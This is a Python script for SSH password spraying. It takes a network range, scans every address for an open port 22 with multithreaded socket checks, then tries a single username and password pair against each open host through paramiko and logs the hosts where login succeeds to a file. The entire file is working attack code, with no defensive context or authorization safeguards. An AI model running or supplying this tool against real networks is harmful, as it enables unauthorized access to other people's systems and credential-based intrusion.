import socket
import sys
import paramiko
import ipaddress
from ipaddress import IPv4Address, IPv4Network
import threading
from queue import Queue
from optparse import OptionParser

###test
###print(len(sys.argv))
if (len(sys.argv) < 9 and '-h' not in sys.argv):
    print("Usage: %s -u <username> -p <password> -t <threads>" % sys.argv[0])
    sys.exit(1)

parser = OptionParser()
parser.add_option("-u", "--username", help="Username to spray with")
parser.add_option("-p", "--password", help="Password to spray with")
parser.add_option("-t", "--threads", help="Number of threads to use")
parser.add_option("-r", "--range", help="Network range to spray")
(options, args) = parser.parse_args()


iplist = []
accesslist = []
username = options.username.strip()
password = options.password.strip()
iprange = options.range
numthreads = options.threads
scanrange = IPv4Network(iprange)
string = "You are running a password spray with username '{}' and password '{}' against netblock {}."
output = string.format(username,password,iprange)
print(output)
print("-"*40)
print("Spraying...")
iprange2 = str(scanrange)
outfile = open("outfile.txt","w")
portopenlist = []

def Connector(ip):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.8)
        result = sock.connect_ex((str(ip),22))
        sock.close()
        if result == 0:
            print("\033[92mPort 22 OPEN on %s\033[0m" % str(ip))
            portopenlist.append(str(ip))
        else:
            pass
    except:
        pass

def Sprayer(ip):
    try:
        ip2 = str(ip)
        ssh = paramiko.SSHClient()
        ssh.load_system_host_keys()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip2, port=22, username=username, password=password, timeout=0.6)
        print("\033[92mlogin successful - %s:%s@%s\033[0m" % (username, password, ip))
        ssh.close()
        accesslist.append(str(ip))
        outfile.write("login successful - %s:%s@%s\n" % (username, password, ip))
    except paramiko.AuthenticationException:
        print("\033[91mAuthentication failed: %s\033[0m" % (ip))
        ssh.close()
    except:
        pass

def threader():
    while True:
        worker = q.get()
        Connector(worker)
        q.task_done()

def threader2():
    while True:
        worker2 = q2.get()
        Sprayer(worker2)
        q2.task_done()

q = Queue()

for ip in ipaddress.IPv4Network(iprange):
    iplist.append(str(ip))

for x in range(int(numthreads)):
    t = threading.Thread(target=threader)
    t.daemon = True
    t.start()

for worker in iplist:
    q.put(worker)

q.join()

q2 = Queue()

for y in range(int(numthreads)):
    t2 = threading.Thread(target=threader2)
    t2.daemon = True
    t2.start()

for worker2 in portopenlist:
    q2.put(worker2)

q2.join()

    
outfile.close()

if len(accesslist) == 0:
    print("-"*100)
    print("Credentials did not work on any hosts in this range.")
    print("-"*100)
    print("Spray done!")
    print("-"*100)
else:
    print("-"*100)
    print("Spray done!")
    print("Data written to outfile.txt in the current directory")
    print("-"*100)

